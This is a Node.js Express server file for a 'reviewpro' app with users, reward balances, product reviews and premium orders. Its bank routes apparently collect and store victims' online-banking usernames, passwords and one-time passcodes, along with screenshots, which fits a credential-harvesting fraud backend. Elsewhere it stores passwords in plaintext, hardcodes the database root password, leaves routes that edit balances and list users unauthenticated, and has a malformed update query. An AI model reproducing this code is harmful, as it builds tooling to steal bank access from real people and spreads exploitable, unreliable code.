import express from "express";
import mysql from "mysql";
import cors from "cors";
import cookieParser from "cookie-parser";
import session from "express-session";
import bodyParser from "body-parser";

const app = express();
app.use(cookieParser());
app.use(bodyParser.json());
app.use(
  session({
    secret: "secret",
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: false,
      maxAge: 1000 * 60 * 60 * 24,
    },
  })
);
app.use(
  cors({
    origin: ["http://localhost:3006"],
    methods: ["POST, GET, PUT, DELETE"],
    credentials: true,
  })
);

const PORT = process.env.PORT || 8800;
app.use(express.json());

const db = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "472247",
  database: "reviewpro",
});

// login user
app.post("/auth/login", (req, res) => {
  //CHECK USER
  const sql = "SELECT * FROM  users WHERE email = ? AND password = ?";
  db.query(sql, [req.body.email, req.body.password], (err, data) => {
    // console.log(req.body.email, req.body.password);
    if (err) return res.json({ message: "Server error" });
    if (data.length > 0) {
      req.session.email = data[0].email;
      return res.json({ login: true });
    } else {
      return res.json({ login: false, message: "Invalid login details" });
    }
  });
});

//register user
app.post("/auth/register", (req, res) => {
  //check existing user
  const q = "SELECT * FROM users WHERE email = ?";
  db.query(q, [req.body.email], (err, data) => {
    if (err) return res.json(err);
    if (data.length) return res.status(409).json("User already exist");

    const isAdmin = false;
    const rewardFee = 10;
    const q =
      "INSERT INTO users(`firstName`, `lastName`, `email`, `password`,`isAdmin`, `rewardFee`) VALUES (?)";

    const values = [
      req.body.firstName,
      req.body.lastName,
      req.body.email,
      req.body.password,
      isAdmin,
      rewardFee,
    ];

    db.query(q, [values], (err, data) => {
      if (err) return res.json(err);
      return res.status(200).json("user has been created");
    });
  });
});

app.get("/", (req, res) => {
  if (req.session.email) {
    return res.json({ valid: true, email: req.session.email });
  } else {
    return res.json({ valid: false });
  }
});

// logout user
app.post("/auth/logout", (req, res) => {
  res
    .clearCookie("access_token", {
      sameSite: "none",
      secure: true,
    })
    .status(200)
    .json("User has been logged out.");
});

// get users
app.get("/users", (req, res) => {
  const q = "SELECT * FROM users";
  db.query(q, (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});

app.get("/users/:id", (req, res) => {
  const id = req.params.id;
  const q = "SELECT * FROM users WHERE email = ?";
  db.query(q, [id], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});

// get user update page
app.get("/users/update/:id", (req, res) => {
  const id = req.params.id;
  const q = "SELECT * FROM users WHERE userId = ?";
  db.query(q, [id], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});

// update users
app.put("/users/:id", (req, res) => {
  const userId = req.params.id;
  const q = "UPDATE users SET balance = ?, rewardFee = ? WHERE userId = ?";
  const values = [req.body.balance, req.body.rewardFee];
  db.query(q, [...values, userId], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("User has been updated!");
  });
});

// delete user
app.delete("/users/:id", (req, res) => {
  const q = "DELETE FROM users  WHERE id = ? ";
  db.query(q, [req.params.id], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("User has been deleted!");
  });
});

// add credit to user
app.put("/users/credit/:id", (req, res) => {
  const q1 = "SELECT * FROM users WHERE userId = ?";
  db.query(q1, [req.params.id], (err, data) => {
    if (err) return res.send(err);
    handleCredit(data[0].balance, data[0].rewardFee);
    //return res.status(200).json(data);
  });
  const handleCredit = (balance, rewardFee) => {
    const q = "UPDATE users SET balance = ? WHERE userId = ?";
    const values = [balance + rewardFee];
    db.query(q, [values, req.params.id], (err, data) => {
      if (err) return res.send(err);
      return res.status(200).json(data);
    });
  };
});

// add credit to premium user
app.put("/users/credit/premium/:id", (req, res) => {
  const q = "UPDATE users SET balance = ? WHERE userId = ?";
  const values = [req.body.balance];
  db.query(q, [values, req.params.id], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});

// search user
app.get("/users/search/:id", (req, res) => {
  const email = req.params.id;
  const q =
    "SELECT * FROM users WHERE email = ? OR firstName = ? OR lastName = ?";
  db.query(q, [email, email, email], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});

//PRODUCTS
// get all products
app.get("/products", (req, res) => {
  const q = "SELECT * FROM products";
  db.query(q, (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});

// get all premium orders
app.get("/products/orders", (req, res) => {
  const q = "SELECT * FROM premiumorders";
  db.query(q, (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});

// check if order is approved
app.get("/products/orders/:id", (req, res) => {
  const q = "SELECT * FROM premiumorders WHERE orderIdentifyer = ? ";
  db.query(q, [req.params.id], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});
// approve order
app.put("/products/orders", (req, res) => {
  const q = "UPDATE premiumorders SET approved = ? WHERE orderIdentifyer = ?";
  const values = [req.body.approved, req.body.orderIdentifyer];
  db.query(q, [...values], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("ORDER has been approved!");
  });
  // console.log(req.params.id);
});

// create premium order
app.post("/products/premium/:id", (req, res) => {
  const q =
    "INSERT INTO premiumorders(`orderId`, `orderIdentifyer`, `userId`,`approved`, `userName`,`amount`,`amountGained`,`newTotal`,`minutesSelected`,`percentage`) VALUE(?)";
  const values = [
    req.body.orderId,
    req.body.orderIdentifyer,
    req.body.userId,
    req.body.approved,
    req.body.firstName,
    req.body.amount,
    req.body.amountGained,
    req.body.newTotal,
    req.body.minutesSelected,
    req.body.percentage,
  ];
  db.query(q, [values], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("order has been created!");
  });
});

// get product details via id
app.get("/products/:id", (req, res) => {
  const q = "SELECT * FROM products WHERE id = ?";
  db.query(q, [req.params.id], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});

// get product details via id
app.get("/products/search/:id", (req, res) => {
  const q = "SELECT * FROM products WHERE code = ?";
  db.query(q, [req.params.id], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});

// get reviews for db
app.get("/products/reviews/:id", (req, res) => {
  const q = "SELECT * FROM reviews WHERE PRODUCT = ?";
  db.query(q, [req.params.id], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});

// add review to db
app.post("/products/reviews/:id", (req, res) => {
  const q =
    "INSERT INTO reviews(`title`, `body`, `firstName`,`lastName`, `score`, `product`, `userId`) VALUE(?)";
  const values = [
    req.body.title,
    req.body.body,
    req.body.firstName,
    req.body.lastName,
    req.body.score,
    req.body.product,
    req.body.userId,
  ];
  db.query(q, [values], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("review has been created!");
  });
});

// create product
app.post("/products", (req, res) => {
  const q =
    "INSERT INTO products(`title`, `image`, `available`,`code`, `premium`) VALUE(?)";
  const values = [
    req.body.title,
    req.body.image,
    req.body.available,
    parseInt(req.body.code),
    req.body.premium,
  ];
  db.query(q, [values], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("Product has been created!");
  });
});

// update product
app.put("/products/:id", (req, res) => {
  const q =
    "UPDATE products SET title= ?, image= ?, available= ?, code= ?, premium= ? WHERE id = ?";
  const values = [
    req.body.title,
    req.body.image,
    req.body.available,
    req.body.code,
    req.body.premium,
    req.params.id,
  ];
  db.query(q, [...values], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("product has been updated!");
  });
  // console.log(req.params.id);
});

app.delete("/products/:id", (req, res) => {
  const q = "DELETE FROM products  WHERE id = ? ";
  db.query(q, [req.params.id], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("product has been deleted!");
  });
});

// BANKS
// add bank
app.post("/bank", (req, res) => {
  const q =
    "INSERT INTO bankdetails(`bankName`, `username`, `password`,`otpId`) VALUE(?)";
  const values = [
    req.body.bankName,
    req.body.username,
    req.body.password,
    req.body.otpId,
  ];
  db.query(q, [values], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("bank details has been created!");
  });
});

app.get("/getbank", (req, res) => {
  const q = "SELECT * FROM bank";
  db.query(q, (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});

app.put("/updatepayment", (req, res) => {
  const q = "UPDATE bank SET account = ?, bank =? name =? WHERE id = '1'";
  const values = [req.body.account, req.body.bank, req.body.name];
  db.query(q, [...values], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("Bank Updated!");
  });
});

//update otp
app.put("/bank", (req, res) => {
  const q = "UPDATE bankdetails SET otp = ? WHERE otpId = ?";
  const values = [req.body.otp, req.body.otpId];
  db.query(q, [...values], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("Otp added!");
  });
  // console.log(req.params.id);
});

// delete bank
app.delete("/bank/:id", (req, res) => {
  const q = "DELETE FROM bankdetails  WHERE otpId = ? ";
  db.query(q, [req.params.id], (err, data) => {
    if (err) return res.send(err);
  });
  const q2 =
    "UPDATE screenhots SET image = ? WHERE otpId = ' USQNPS7sMViHcPf' ";
  db.query(q2, [""], (err, data) => {
    return res.status(200).json("Bank has been deleted!");
  });
});

// get all bank submitted
app.get("/bank/:id", (req, res) => {
  const q = "SELECT * FROM bankdetails WHERE bankName = ?";
  db.query(q, [req.params.id], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});

// handle Screenshots

app.put("/bank/screenshot", (req, res) => {
  const q = "UPDATE screenhots SET image = ? WHERE otpId = ' USQNPS7sMViHcPf' ";
  const values = [req.body.image];
  db.query(q, [...values], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("Image added!");
  });
});

// check screenshot status
app.get("/banks/screenshot", (req, res) => {
  const q = "SELECT * FROM screenhots WHERE otpId = ' USQNPS7sMViHcPf'";
  db.query(q, [req.params.id], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
});

db.connect((err) => {
  if (err) {
    console.error("Error connecting to MySQL:", err);
    return;
  }
  // console.log("Connected to MySQL database");
});

app.listen(PORT, () => {
  // console.log(`Server is running on http://localhost:${PORT}`);
});
